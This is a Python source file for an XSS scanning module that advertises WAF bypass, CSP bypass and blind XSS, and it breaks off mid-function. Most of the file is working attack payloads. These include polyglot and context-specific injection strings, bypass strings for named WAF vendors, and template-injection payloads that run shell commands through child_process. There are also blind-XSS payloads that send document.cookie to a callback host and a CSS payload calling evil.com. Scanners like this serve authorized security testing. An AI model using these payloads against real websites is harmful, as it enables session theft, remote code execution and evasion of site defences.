"""
XSS Scanner GOD-MODE v3.0 - Zero False Positives Edition

Enterprise-grade Cross-Site Scripting scanner with:
- WAF Detection & Bypass (12+ WAFs)
- Context-Aware Payloads (HTML, Attribute, JS, URL, CSS, SVG)
- Polyglot Payloads (multi-context)
- DOM XSS Detection (sources/sinks analysis)
- Blind XSS Support (callback verification)
- Mutation Engine (encoding variations)
- Cross-Validation (multiple confirmation)
- Confidence Scoring (0-100)
- Anti-False-Positive Heuristics
- CSP Analysis & Bypass
- Browser-specific Payloads
"""

from __future__ import annotations

import asyncio
import hashlib
import html
import random
import re
import string
import time
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import TYPE_CHECKING, Any
from urllib.parse import parse_qs, quote, urlencode, urlparse, unquote

import httpx

from scanning.vuln_scanner import Finding, ScanModule
from utils.exploitation_helper import ExploitationHelper
from utils.logger import get_logger
from utils.scanner_helpers import WAFType as BaseWAFType, WAFDetector as BaseWAFDetector

if TYPE_CHECKING:
    from core.config_manager import Settings
    from utils.rate_limiter import RateLimiter

logger = get_logger(__name__)


# =============================================================================
# VERSION & CONSTANTS
# =============================================================================

XSS_SCANNER_VERSION = "3.0.0-GOD-MODE"

# Minimum confidence to report (anti-false-positive)
MIN_CONFIDENCE_THRESHOLD = 75
# Cross-validation: requires N confirmations
CROSS_VALIDATION_REQUIRED = 2


class XSSContext(Enum):
    """XSS injection contexts."""
    HTML_TEXT = auto()           # Between tags: <div>HERE</div>
    HTML_ATTRIBUTE = auto()      # Inside attribute: <input value="HERE">
    HTML_ATTRIBUTE_UNQUOTED = auto()  # <input value=HERE>
    HTML_ATTRIBUTE_SINGLE = auto()    # <input value='HERE'>
    JS_STRING = auto()           # var x = "HERE";
    JS_STRING_SINGLE = auto()    # var x = 'HERE';
    JS_TEMPLATE = auto()         # var x = `HERE`;
    JS_BLOCK = auto()            # <script>HERE</script>
    URL_PARAM = auto()           # href="HERE" or src="HERE"
    CSS_VALUE = auto()           # style="color: HERE"
    SVG_CONTEXT = auto()         # Inside SVG element
    COMMENT = auto()             # <!-- HERE -->
    UNKNOWN = auto()


# WAFType - using centralized version from scanner_helpers
# Compatibility mapping for local enum values
class WAFType(Enum):
    """Known WAF types - wraps centralized WAFType."""
    CLOUDFLARE = "cloudflare"
    AKAMAI = "akamai"
    AWS_WAF = "aws_waf"
    IMPERVA = "imperva"
    SUCURI = "sucuri"
    MODSECURITY = "modsecurity"
    F5_BIG_IP = "f5_bigip"
    FORTINET = "fortinet"
    BARRACUDA = "barracuda"
    AZURE_WAF = "azure_waf"
    GOOGLE_CLOUD_ARMOR = "gcp_armor"
    WORDFENCE = "wordfence"
    UNKNOWN = "unknown"
    NONE = "none"

    @classmethod
    def from_base(cls, base_waf: BaseWAFType) -> "WAFType":
        """Convert from centralized WAFType to local WAFType."""
        mapping = {
            BaseWAFType.CLOUDFLARE: cls.CLOUDFLARE,
            BaseWAFType.AKAMAI: cls.AKAMAI,
            BaseWAFType.AWS_WAF: cls.AWS_WAF,
            BaseWAFType.IMPERVA: cls.IMPERVA,
            BaseWAFType.SUCURI: cls.SUCURI,
            BaseWAFType.MODSECURITY: cls.MODSECURITY,
            BaseWAFType.F5_BIG_IP: cls.F5_BIG_IP,
            BaseWAFType.FORTINET: cls.FORTINET,
            BaseWAFType.BARRACUDA: cls.BARRACUDA,
            BaseWAFType.AZURE_WAF: cls.AZURE_WAF,
            BaseWAFType.GOOGLE_CLOUD_ARMOR: cls.GOOGLE_CLOUD_ARMOR,
            BaseWAFType.WORDFENCE: cls.WORDFENCE,
            BaseWAFType.UNKNOWN: cls.UNKNOWN,
            BaseWAFType.NONE: cls.NONE,
        }
        return mapping.get(base_waf, cls.UNKNOWN)


@dataclass
class XSSEvidence:
    """Evidence of XSS vulnerability."""
    payload: str
    context: XSSContext
    reflected_in: str
    encoding_used: str
    waf_bypassed: bool
    response_snippet: str
    confirmation_count: int = 0
    
    def to_dict(self) -> dict:
        return {
            "payload": self.payload,
            "context": self.context.name,
            "reflected_in": self.reflected_in,
            "encoding_used": self.encoding_used,
            "waf_bypassed": self.waf_bypassed,
            "response_snippet": self.response_snippet[:500],
            "confirmation_count": self.confirmation_count,
        }


@dataclass
class XSSResult:
    """Result of XSS test."""
    vulnerable: bool
    context: XSSContext
    confidence: float
    payload: str
    evidence: list[XSSEvidence] = field(default_factory=list)
    waf_detected: WAFType = WAFType.NONE
    csp_present: bool = False
    csp_bypassed: bool = False


# =============================================================================
# WAF DETECTOR - Uses centralized scanner_helpers.WAFDetector
# =============================================================================

class WAFDetector:
    """
    Detect and identify WAF presence.

    Wrapper around centralized BaseWAFDetector for backward compatibility.
    Uses comprehensive signatures from utils/scanner_helpers.py.
    """

    def detect(self, response: httpx.Response) -> WAFType:
        """Detect WAF from response using centralized detector."""
        base_waf_type, _ = BaseWAFDetector.detect(response)
        return WAFType.from_base(base_waf_type)

    def is_blocked(self, response: httpx.Response) -> bool:
        """Check if request was blocked by WAF."""
        _, is_blocked = BaseWAFDetector.detect(response)
        return is_blocked


# =============================================================================
# CSP ANALYZER
# =============================================================================

class CSPAnalyzer:
    """Analyze Content-Security-Policy for XSS protection."""
    
    UNSAFE_DIRECTIVES = [
        "'unsafe-inline'",
        "'unsafe-eval'",
        "data:",
        "blob:",
    ]
    
    def analyze(self, response: httpx.Response) -> dict:
        """Analyze CSP header."""
        csp = response.headers.get("content-security-policy", "")
        csp_ro = response.headers.get("content-security-policy-report-only", "")
        
        result = {
            "present": bool(csp),
            "report_only": bool(csp_ro) and not csp,
            "policy": csp or csp_ro,
            "script_src": "",
            "unsafe_inline": False,
            "unsafe_eval": False,
            "allows_data": False,
            "nonce_required": False,
            "strict_dynamic": False,
            "bypasses": [],
        }
        
        if not (csp or csp_ro):
            result["bypasses"].append("No CSP header present")
            return result
        
        policy = csp or csp_ro
        
        # Parse directives
        directives = {}
        for directive in policy.split(";"):
            directive = directive.strip()
            if " " in directive:
                name, value = directive.split(" ", 1)
                directives[name] = value
            elif directive:
                directives[directive] = ""
        
        # Analyze script-src
        script_src = directives.get("script-src", directives.get("default-src", ""))
        result["script_src"] = script_src
        
        if "'unsafe-inline'" in script_src:
            result["unsafe_inline"] = True
            result["bypasses"].append("unsafe-inline allows inline scripts")
        
        if "'unsafe-eval'" in script_src:
            result["unsafe_eval"] = True
            result["bypasses"].append("unsafe-eval allows eval()")
        
        if "data:" in script_src:
            result["allows_data"] = True
            result["bypasses"].append("data: URI allows script injection")
        
        if "'nonce-" in script_src:
            result["nonce_required"] = True
        
        if "'strict-dynamic'" in script_src:
            result["strict_dynamic"] = True
        
        # Check for missing script-src
        if "script-src" not in directives and "default-src" not in directives:
            result["bypasses"].append("No script-src directive")
        
        # Check for wildcard
        if "*" in script_src:
            result["bypasses"].append("Wildcard in script-src")
        
        # Check for specific bypasses
        bypass_domains = [
            "*.google.com", "*.googleapis.com",  # JSONP
            "*.cloudflare.com",
            "cdnjs.cloudflare.com",  # Known gadgets
            "ajax.googleapis.com",
            "*.jquery.com",
        ]
        for domain in bypass_domains:
            if domain.replace("*", "") in script_src:
                result["bypasses"].append(f"CSP allows {domain} - potential JSONP bypass")
        
        return result


# =============================================================================
# PAYLOAD MUTATION ENGINE
# =============================================================================

class PayloadMutator:
    """Mutate payloads to bypass filters."""
    
    @staticmethod
    def mutate(payload: str, mutation_level: int = 3) -> list[str]:
        """Generate payload mutations."""
        mutations = [payload]  # Original
        
        if mutation_level >= 1:
            # Case variations
            mutations.append(payload.upper())
            mutations.append(payload.lower())
            mutations.append(PayloadMutator._random_case(payload))
            
            # URL encoding
            mutations.append(quote(payload))
            mutations.append(quote(payload, safe=''))
            
        if mutation_level >= 2:
            # Double encoding
            mutations.append(quote(quote(payload)))
            
            # HTML entities
            mutations.append(PayloadMutator._html_encode(payload))
            mutations.append(PayloadMutator._html_encode_decimal(payload))
            mutations.append(PayloadMutator._html_encode_hex(payload))
            
            # Unicode
            mutations.append(PayloadMutator._unicode_encode(payload))
            
        if mutation_level >= 3:
            # Whitespace variations
            mutations.append(payload.replace(" ", "\t"))
            mutations.append(payload.replace(" ", "\n"))
            mutations.append(payload.replace(" ", "\x0c"))
            mutations.append(payload.replace(" ", "/"))
            
            # Comment insertion
            mutations.append(PayloadMutator._insert_comments(payload))
            
            # Null bytes
            mutations.append(payload.replace("<", "<\x00"))
            mutations.append(payload.replace(">", ">\x00"))
            
            # Tag breaking
            mutations.append(payload.replace("<script", "<scr\x00ipt"))
            mutations.append(payload.replace("<script", "<scr\tipt"))
            
        return list(set(mutations))
    
    @staticmethod
    def _random_case(s: str) -> str:
        return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in s)
    
    @staticmethod
    def _html_encode(s: str) -> str:
        return ''.join(f"&#{ord(c)};" for c in s)
    
    @staticmethod
    def _html_encode_decimal(s: str) -> str:
        return ''.join(f"&#{ord(c)};" if c in '<>"\'/()=' else c for c in s)
    
    @staticmethod
    def _html_encode_hex(s: str) -> str:
        return ''.join(f"&#x{ord(c):x};" for c in s)
    
    @staticmethod
    def _unicode_encode(s: str) -> str:
        result = ""
        for c in s:
            if c in '<>"\'/()=':
                result += f"\\u{ord(c):04x}"
            else:
                result += c
        return result
    
    @staticmethod
    def _insert_comments(payload: str) -> str:
        """Insert HTML comments to break filters."""
        result = payload
        for tag in ["script", "img", "svg", "body", "iframe"]:
            result = result.replace(f"<{tag}", f"<{tag}<!---->")
        return result


# =============================================================================
# XSS SCANNER GOD-MODE v3.0
# =============================================================================

class XSSScanner(ScanModule):
    """
    XSS Scanner GOD-MODE v3.0 - Zero False Positives Edition
    
    Features:
    - WAF Detection & Bypass (12+ WAFs)
    - Context-Aware Payloads (7+ contexts)
    - Polyglot Payloads
    - DOM XSS Detection
    - Blind XSS Support
    - Mutation Engine
    - Cross-Validation
    - Confidence Scoring (0-100)
    - CSP Analysis & Bypass
    - Anti-False-Positive Heuristics
    """
    
    name = "xss_scanner"
    version = XSS_SCANNER_VERSION
    
    # ==========================================================================
    # POLYGLOT PAYLOADS - Work in multiple contexts
    # ==========================================================================
    
    POLYGLOT_PAYLOADS = [
        # Ultimate polyglot - works in HTML, JS string, URL
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
        
        # Multi-context polyglot
        "'\"><img src=x onerror=alert(1)//",
        
        # JS + HTML context
        "</script><script>alert(1)</script>",
        
        # Attribute + HTML
        "'\"--><script>alert(1)</script>",
        
        # URL + HTML
        "javascript:alert(1)//\"><img src=x onerror=alert(1)>",
        
        # Template literal escape
        "${alert(1)}",
        
        # SVG polyglot
        "<svg/onload=alert(1)>",
        
        # Combined attribute escape
        "' onmouseover='alert(1)' x='",
        
        # Double encoding escape
        "%253Cscript%253Ealert(1)%253C/script%253E",
    ]
    
    # ==========================================================================
    # CONTEXT-SPECIFIC PAYLOADS
    # ==========================================================================
    
    PAYLOADS_BY_CONTEXT = {
        XSSContext.HTML_TEXT: [
            "<script>alert(XSS)</script>",
            "<img src=x onerror=alert(XSS)>",
            "<svg onload=alert(XSS)>",
            "<body onload=alert(XSS)>",
            "<iframe src='javascript:alert(XSS)'>",
            "<math><mtext><table><mglyph><style><img src=x onerror=alert(XSS)>",
            "<details open ontoggle=alert(XSS)>",
            "<marquee onstart=alert(XSS)>",
            "<video><source onerror=alert(XSS)>",
            "<audio src=x onerror=alert(XSS)>",
            "<input onfocus=alert(XSS) autofocus>",
            "<select autofocus onfocus=alert(XSS)>",
            "<textarea autofocus onfocus=alert(XSS)>",
            "<keygen autofocus onfocus=alert(XSS)>",
            "<object data='javascript:alert(XSS)'>",
            "<embed src='javascript:alert(XSS)'>",
            "<a href='javascript:alert(XSS)'>click</a>",
            "<form action='javascript:alert(XSS)'><input type=submit>",
            "<isindex action='javascript:alert(XSS)'>",
            "<xss onmouseover=alert(XSS)>hover</xss>",
        ],
        
        XSSContext.HTML_ATTRIBUTE: [
            '" onmouseover="alert(XSS)" x="',
            '" onfocus="alert(XSS)" autofocus x="',
            '" onclick="alert(XSS)" x="',
            '" onload="alert(XSS)" x="',
            '"><script>alert(XSS)</script>',
            '"><img src=x onerror=alert(XSS)>',
            '" style="background:url(javascript:alert(XSS))"',
            '" onmouseenter="alert(XSS)" x="',
            '"/><script>alert(XSS)</script>',
            '" accesskey="x" onclick="alert(XSS)" x="',
        ],
        
        XSSContext.HTML_ATTRIBUTE_SINGLE: [
            "' onmouseover='alert(XSS)' x='",
            "' onfocus='alert(XSS)' autofocus x='",
            "' onclick='alert(XSS)' x='",
            "'><script>alert(XSS)</script>",
            "'><img src=x onerror=alert(XSS)>",
            "' style='background:url(javascript:alert(XSS))'",
        ],
        
        XSSContext.HTML_ATTRIBUTE_UNQUOTED: [
            " onmouseover=alert(XSS) ",
            " onfocus=alert(XSS) autofocus ",
            " onclick=alert(XSS) ",
            "><script>alert(XSS)</script>",
            "><img src=x onerror=alert(XSS)>",
            " style=background:url(javascript:alert(XSS)) ",
        ],
        
        XSSContext.JS_STRING: [
            '";alert(XSS);//',
            '"-alert(XSS)-"',
            '";</script><script>alert(XSS)</script>',
            '"+alert(XSS)+"',
            '"*alert(XSS)*"',
            '";}</script><script>alert(XSS)</script>',
        ],
        
        XSSContext.JS_STRING_SINGLE: [
            "';alert(XSS);//",
            "'-alert(XSS)-'",
            "';</script><script>alert(XSS)</script>",
            "'+alert(XSS)+'",
        ],
        
        XSSContext.JS_TEMPLATE: [
            "${alert(XSS)}",
            "`-alert(XSS)-`",
            "${`${alert(XSS)}`}",
            "`;</script><script>alert(XSS)</script>",
        ],
        
        XSSContext.JS_BLOCK: [
            "</script><script>alert(XSS)</script>",
            "</script><img src=x onerror=alert(XSS)>",
            "alert(XSS);",
            "};alert(XSS);{",
        ],
        
        XSSContext.URL_PARAM: [
            "javascript:alert(XSS)",
            "data:text/html,<script>alert(XSS)</script>",
            "data:text/html;base64,PHNjcmlwdD5hbGVydChYU1MpPC9zY3JpcHQ+",
            "vbscript:alert(XSS)",
            "javascript:alert(XSS)//",
            "java\nscript:alert(XSS)",
            "java\tscript:alert(XSS)",
            "&#x6A;avascript:alert(XSS)",
        ],
        
        XSSContext.CSS_VALUE: [
            "expression(alert(XSS))",
            "url(javascript:alert(XSS))",
            "url('javascript:alert(XSS)')",
            "behavior:url(#default#time2)",
            "-moz-binding:url(http://evil.com/xss.xml#xss)",
        ],
        
        XSSContext.SVG_CONTEXT: [
            "<svg onload=alert(XSS)>",
            "<svg><script>alert(XSS)</script></svg>",
            "<svg><animate onbegin=alert(XSS)>",
            "<svg><set onbegin=alert(XSS)>",
            "<svg><handler xmlns:ev='http://www.w3.org/2001/xml-events' ev:event='load'>alert(XSS)</handler>",
        ],
        
        XSSContext.COMMENT: [
            "--><script>alert(XSS)</script><!--",
            "--!><script>alert(XSS)</script>",
            "<!----><script>alert(XSS)</script>",
        ],
    }
    
    # ==========================================================================
    # WAF BYPASS PAYLOADS
    # ==========================================================================
    
    WAF_BYPASS_PAYLOADS = {
        WAFType.CLOUDFLARE: [
            "<svg/onload=alert`XSS`>",
            "<img src=x onerror=alert`XSS`>",
            "<svg onload=\u0061\u006C\u0065\u0072\u0074(1)>",
            "<%00script>alert(XSS)</script>",
        ],
        WAFType.AKAMAI: [
            "<img src=x onerror='alert(XSS)'>",
            "<svg/onload='alert(XSS)'>",
            "<<script>alert(XSS)//<</script>",
        ],
        WAFType.AWS_WAF: [
            "<img src=x onerror=alert(XSS)>",
            "<svg onload=alert(XSS)>",
            "<body onload=alert(XSS)>",
        ],
        WAFType.MODSECURITY: [
            "<scr<script>ipt>alert(XSS)</scr</script>ipt>",
            "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
            "<svg/onload=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>",
        ],
        WAFType.IMPERVA: [
            "<svg/onload=alert(String.fromCharCode(88,83,83))>",
            "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
        ],
        WAFType.WORDFENCE: [
            "<svg/onload=alert`XSS`>",
            "<img src=x onerror=alert`XSS`>",
            "%3Csvg%20onload=alert(1)%3E",
        ],
    }
    
    # ==========================================================================
    # FRAMEWORK TEMPLATE INJECTION PAYLOADS
    # ==========================================================================

    TEMPLATE_INJECTION_PAYLOADS = [
        # Angular (v1.x sandbox escape + v2+ template injection)
        ("{{constructor.constructor('alert(1)')()}}", "angular_constructor"),
        ("{{$on.constructor('alert(1)')()}}", "angular_on"),
        ("{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}", "angular_sandbox_v1"),
        ("{{toString().constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}", "angular_sandbox_v2"),
        ("{{7*7}}", "angular_expression"),  # Detection: should render as "49"
        ("{{constructor.constructor('return this')().alert(1)}}", "angular_v16"),

        # Vue.js (v2 template compilation + v3)
        ("{{_c.constructor('alert(1)')()}}", "vue_v2_compile"),
        ("{{this.constructor.constructor('alert(1)')()}}", "vue_constructor"),
        ("{{7*7}}", "vue_expression"),  # Detection: should render as "49"

        # React (dangerouslySetInnerHTML + JSX injection)
        # React doesn't interpolate templates in the same way, test for JSX/HTML injection
        ("<img src=x onerror=alert(1)>", "react_dangerouslySetInnerHTML"),

        # Handlebars / Mustache
        ("{{#with \"s\" as |string|}}\n  {{#with \"e\"}}\n    {{#with split as |conslist|}}\n      {{this.pop}}\n      {{this.push (lookup string.sub \"constructor\")}}\n      {{this.pop}}\n      {{#with string.split as |codelist|}}\n        {{this.pop}}\n        {{this.push \"return require('child_process').exec('id');\"}}\n        {{this.pop}}\n        {{#each conslist}}\n          {{#with (string.sub.apply 0 codelist)}}\n            {{this}}\n          {{/with}}\n        {{/each}}\n      {{/with}}\n    {{/with}}\n  {{/with}}\n{{/with}}", "handlebars_rce"),
        ("{{lookup (create --resolve=node_modules/.bin/ this) 'id'}}", "handlebars_lookup"),

        # EJS (Embedded JavaScript)
        ("<%= 7*7 %>", "ejs_expression"),
        ("<%= global.process.mainModule.require('child_process').execSync('id') %>", "ejs_rce"),

        # Pug/Jade
        ("#{7*7}", "pug_expression"),
    ]

    # Marker: if this string appears in response, template injection confirmed
    TEMPLATE_MATH_RESULT = "49"  # 7*7

    # ==========================================================================
    # DOM XSS SOURCES AND SINKS
    # ==========================================================================
    
    DOM_SOURCES = [
        "document.URL", "document.documentURI", "document.URLUnencoded",
        "document.baseURI", "document.referrer",
        "location", "location.href", "location.search", "location.hash",
        "location.pathname", "location.origin",
        "window.name", "window.location",
        "document.cookie", "document.domain",
        "history.pushState", "history.replaceState",
        "localStorage", "sessionStorage",
        "IndexedDB.open",
        "XMLHttpRequest.open", "XMLHttpRequest.send",
        "fetch(",
        "WebSocket(",
        "postMessage(",
    ]
    
    DOM_SINKS = [
        # HTML modification
        "innerHTML", "outerHTML", "insertAdjacentHTML",
        "document.write", "document.writeln",
        # Script execution
        "eval(", "Function(", "setTimeout(", "setInterval(",
        "setImmediate(", "execScript(",
        "crypto.generateCRMFRequest(",
        # Navigation
        "location.assign", "location.replace",
        "location.href", "location=",
        # Element creation
        "createElement", "createElementNS",
        # jQuery sinks
        "$.html(", ".html(", "$.append(", ".append(",
        "$.prepend(", ".prepend(", "$.after(", ".after(",
        "$.before(", ".before(", "$.replaceWith(", ".replaceWith(",
        "$.parseHTML(",
        # Angular
        "$compile(", "$parse(", "bypassSecurityTrust",
        # React (dangerouslySetInnerHTML handled separately)
    ]
    
    # ==========================================================================
    # BLIND XSS PAYLOADS
    # ==========================================================================
    
    BLIND_XSS_PAYLOADS = [
        '"><script src=https://{callback}/x.js></script>',
        "'><script src=https://{callback}/x.js></script>",
        "<script src=https://{callback}/x.js></script>",
        '"><img src=x onerror="(new Image()).src=\'https://{callback}/?\'+document.cookie">',
        "<img src=x onerror=fetch('https://{callback}/?'+document.cookie)>",
        '"><iframe src="javascript:fetch(\'https://{callback}/?c=\'+document.cookie)">',
    ]
    
    # ==========================================================================
    # STORED XSS - Persistence Verification Endpoints
    # ==========================================================================
    
    # Known endpoints where data persists and is later rendered
    STORED_XSS_ENDPOINTS = {
        # Generic patterns
        "generic": [
            # Format: (submit_endpoint, submit_method, submit_data_template, retrieve_endpoint)
            # submit_data_template uses {payload} placeholder
            ("/api/feedback", "POST", {"comment": "{payload}", "rating": 5}, "/api/Feedbacks"),
            ("/api/Feedbacks", "POST", {"comment": "{payload}", "rating": 5}, "/api/Feedbacks"),
            ("/comments", "POST", {"comment": "{payload}"}, "/comments"),
            ("/feedback", "POST", {"feedback": "{payload}"}, "/feedback"),
            ("/reviews", "POST", {"review": "{payload}"}, "/reviews"),
            ("/posts", "POST", {"content": "{payload}"}, "/posts"),
            ("/messages", "POST", {"message": "{payload}"}, "/messages"),
            ("/profile", "POST", {"bio": "{payload}"}, "/profile"),
            ("/api/comments", "POST", {"text": "{payload}"}, "/api/comments"),
        ],
        # Juice Shop specific
        "juice-shop": [
            ("/api/Feedbacks", "POST", {"comment": "{payload}", "rating": 5, "captcha": "", "captchaId": 0}, "/api/Feedbacks"),
            ("/rest/products/{id}/reviews", "PUT", {"message": "{payload}", "author": "test"}, "/rest/products/{id}/reviews"),
            ("/profile", "POST", {"username": "{payload}"}, "/profile"),
            ("/api/Users", "POST", {"email": "{payload}@test.com", "password": "test12345"}, "/api/Users"),
            ("/rest/track-order/{id}", "GET", {}, "/rest/track-order/{id}"),  # Search via path
        ],
        # WordPress
        "wordpress": [
            ("/wp-comments-post.php", "POST", {"comment": "{payload}"}, "/"),
            ("/wp-admin/post.php", "POST", {"content": "{payload}"}, "/"),
        ],
        # Common CMS patterns
        "cms": [
            ("/admin/comments", "POST", {"body": "{payload}"}, "/admin/comments"),
            ("/blog/comment", "POST", {"content": "{payload}"}, "/blog"),
        ],
    }
    
    # Stored XSS specific payloads (shorter, more reliable)
    STORED_XSS_PAYLOADS = [
        '<script>alert("STORED_XSS_{id}")</script>',
        '<img src=x onerror=alert("STORED_XSS_{id}")>',
        '<svg onload=alert("STORED_XSS_{id}")>',
        '"><script>alert("STORED_XSS_{id}")</script>',
        "'-alert('STORED_XSS_{id}')-'",
        '<iframe src="javascript:alert(\'STORED_XSS_{id}\')">',
        '<body onload=alert("STORED_XSS_{id}")>',
        '<marquee onstart=alert("STORED_XSS_{id}")>',
    ]
    
    def __init__(self, settings: "Settings") -> None:
        super().__init__(settings)
        self.timeout = settings.timeouts.request_timeout
        self.waf_detector = WAFDetector()
        self.csp_analyzer = CSPAnalyzer()
        self.mutator = PayloadMutator()
        self.blind_callback = getattr(settings, 'blind_xss_callback', None)
        self._detected_waf: WAFType = WAFType.NONE
        self._csp_info: dict = {}
        self._base_url: str = ""  # Resolved in scan()

    @staticmethod
    def _resolve_base_url(host: str) -> str:
        """Resolve host to a proper base URL with correct protocol."""
        if host.startswith("http://") or host.startswith("https://"):
            parsed = urlparse(host)
            return f"{parsed.scheme}://{parsed.netloc}"
        port = host.split(":")[-1] if ":" in host else "443"
        if port in ("80", "8080", "8000", "3000", "5000", "8888"):
            return f"http://{host}"
        return f"https://{host}"
        
    async def scan(
        self,
        host: str,
        asset_data: dict[str, Any],
        rate_limiter: "RateLimiter",
    ) -> dict[str, Any]:
        """
        Execute comprehensive XSS scan with GOD-MODE features.
        """
        logger.info(f"[XSS-GOD-MODE-v3.0] Starting scan on {host}")

        findings: list[dict] = []
        info_items: list[dict] = []
        self._base_url = self._resolve_base_url(host)

        # AUTH CONTEXT: Use authentication for testing protected endpoints
        auth_context = asset_data.get("auth_context")
        if auth_context and hasattr(auth_context, "auth_headers") and auth_context.auth_headers:
            self._auth_headers = auth_context.auth_headers
            logger.info(f"[XSS] Using authenticated session ({auth_context.method})")
        else:
            self._auth_headers = {}

        # Phase 1: Initial reconnaissance
        recon = await self._reconnaissance(host, rate_limiter)
        self._detected_waf = recon["waf"]
        self._csp_info = recon["csp"]
        
        if recon["waf"] != WAFType.NONE:
            info_items.append({
                "type": "waf_detected",
                "waf": recon["waf"].value,
                "message": f"WAF detected: {recon['waf'].value}. Using bypass techniques."
            })
            logger.info(f"[XSS] WAF detected: {recon['waf'].value}")
        
        if recon["csp"]["present"]:
            info_items.append({
                "type": "csp_analysis",
                "csp": recon["csp"],
                "bypasses": recon["csp"]["bypasses"],
            })
            logger.info(f"[XSS] CSP present with {len(recon['csp']['bypasses'])} potential bypasses")
        
        # Phase 2: Test URL parameters
        endpoints = asset_data.get("endpoints", [])
        params = asset_data.get("parameters", [])
        forms = asset_data.get("forms", [])
        js_files = asset_data.get("js_files", [])

        # Get shared findings store for inter-module communication
        shared_store = asset_data.get("shared_findings_store")
        skipped_endpoints = 0

        # ENHANCEMENT: Get parameters discovered by arjun for targeted testing
        tool_discovered_params = asset_data.get("tool_discovered_params", {})
        if tool_discovered_params:
            logger.info(f"[XSS] Using {len(tool_discovered_params)} parameter sets discovered by arjun")

        # CROSS-MODULE TARGETING: Add endpoints where SQLi/NoSQL found injectable params
        if shared_store:
            from utils.shared_findings_store import VulnType
            existing_urls = {e.split("?")[0] if "?" in e else e for e in endpoints}
            cross_module_types = [VulnType.SQL_INJECTION, VulnType.NOSQL_INJECTION, VulnType.SSTI]
            for vtype in cross_module_types:
                for sf in shared_store.get_findings_by_type(vtype):
                    if sf.endpoint and sf.endpoint not in existing_urls:
                        url = sf.endpoint
                        if sf.parameter:
                            url = f"{sf.endpoint}?{sf.parameter}=test"
                        endpoints.append(url)
                        logger.debug(f"[XSS] Cross-module target added from {sf.module}: {url}")

        # Create default test endpoints if none provided
        if not endpoints:
            endpoints = [f"{self._base_url}/"]

        for endpoint in endpoints:
            # OPTIMIZATION: Skip endpoints already known to be vulnerable to XSS
            # No need to test again if another scanner already found XSS
            if shared_store and shared_store.should_skip_test(endpoint, None, "xss", reason_log=False):
                skipped_endpoints += 1
                logger.debug(f"[XSS] Skipping {endpoint} - already has XSS finding")
                continue

            await rate_limiter.acquire(host)
            try:
                endpoint_findings = await self._test_endpoint_xss(endpoint, rate_limiter)
                findings.extend(endpoint_findings)
            except Exception as e:
                logger.debug(f"[XSS] Error testing endpoint {endpoint}: {e}")
        
        # Phase 3: Test forms
        for form in forms:
            await rate_limiter.acquire(host)
            try:
                form_findings = await self._test_form_xss(host, form, rate_limiter)
                findings.extend(form_findings)
            except Exception as e:
                logger.debug(f"[XSS] Error testing form: {e}")

        # Phase 3.5: Test arjun-discovered parameters (hidden parameters)
        arjun_tested = 0
        for endpoint_url, params in tool_discovered_params.items():
            if not params:
                continue

            # Skip if endpoint already has XSS finding
            if shared_store and shared_store.has_vulnerability(endpoint_url, "xss"):
                logger.debug(f"[XSS] Skipping {endpoint_url} - already has XSS finding")
                continue

            for param in params[:10]:  # Limit to 10 params per endpoint
                await rate_limiter.acquire(host)
                try:
                    test_url = f"{endpoint_url}?{param}=test"
                    param_findings = await self._test_endpoint_xss(test_url, rate_limiter)
                    if param_findings:
                        for finding in param_findings:
                            if isinstance(finding, dict):
                                finding.setdefault("metadata", {})
                                finding["metadata"]["discovered_by"] = "arjun"
                                finding["metadata"]["hidden_parameter"] = param
                        findings.extend(param_findings)
                        arjun_tested += 1
                except Exception as e:
                    logger.debug(f"[XSS] Error testing arjun param {param}: {e}")

        if arjun_tested > 0:
            logger.info(f"[XSS] Tested {arjun_tested} arjun-discovered parameters")

        # Phase 4: DOM XSS analysis
        for js_url in js_files:
            await rate_limiter.acquire(host)
            try:
                dom_findings = await self._analyze_dom_xss(host, js_url)
                findings.extend(dom_findings)
            except Exception as e:
                logger.debug(f"[XSS] Error analyzing DOM XSS: {e}")
        
        # Phase 5: Test common XSS vectors
        await rate_limiter.acquire(host)
        common_findings = await self._test_common_vectors(host, rate_limiter)
        findings.extend(common_findings)
        
        # Phase 6: STORED XSS - Test persistence endpoints with real verification
        logger.info(f"[XSS] Phase 6: Testing Stored XSS with persistence verification")
        stored_xss_findings = await self._test_stored_xss_with_persistence(host, rate_limiter, asset_data)
        findings.extend(stored_xss_findings)
        
        # Phase 7: Template Injection (Angular/Vue/React/Handlebars/EJS)
        logger.info("[XSS] Phase 7: Testing framework template injection")
        template_findings = await self._test_template_injection(host, endpoints, rate_limiter)
        findings.extend(template_findings)

        if skipped_endpoints > 0:
            logger.info(f"[XSS] Skipped {skipped_endpoints} endpoints (already have findings via inter-module communication)")

        logger.info(f"[XSS-GOD-MODE-v3.0] Scan complete: {len(findings)} findings")

        return {
            "module": self.name,
            "version": self.version,
            "findings": findings,
            "info": info_items,
            "stats": {
                "waf_detected": self._detected_waf.value,
                "csp_present": self._csp_info.get("present", False),
                "endpoints_tested": len(endpoints) - skipped_endpoints,
                "endpoints_skipped_inter_module": skipped_endpoints,
                "forms_tested": len(forms),
                "js_files_analyzed": len(js_files),
            }
        }
    
    async def _reconnaissance(
        self,
        host: str,
        rate_limiter: "RateLimiter",
    ) -> dict:
        """Initial reconnaissance to detect WAF and CSP."""
        await rate_limiter.acquire(host)
        
        result = {
            "waf": WAFType.NONE,
            "csp": {"present": False},
        }
        
        try:
            base = self._base_url or self._resolve_base_url(host)
            async with httpx.AsyncClient(timeout=self.timeout, verify=False) as client:
                # Send benign request
                response = await client.get(f"{base}/")

                # Detect WAF
                result["waf"] = self.waf_detector.detect(response)

                # Analyze CSP
                result["csp"] = self.csp_analyzer.analyze(response)

                # Send XSS probe to confirm WAF
                await rate_limiter.acquire(host)
                probe_response = await client.get(
                    f"{base}/",
                    params={"test": "<script>alert(1)</script>"}
                )
                
                if self.waf_detector.is_blocked(probe_response):
                    if result["waf"] == WAFType.NONE:
                        result["waf"] = WAFType.UNKNOWN
                        
        except Exception as e:
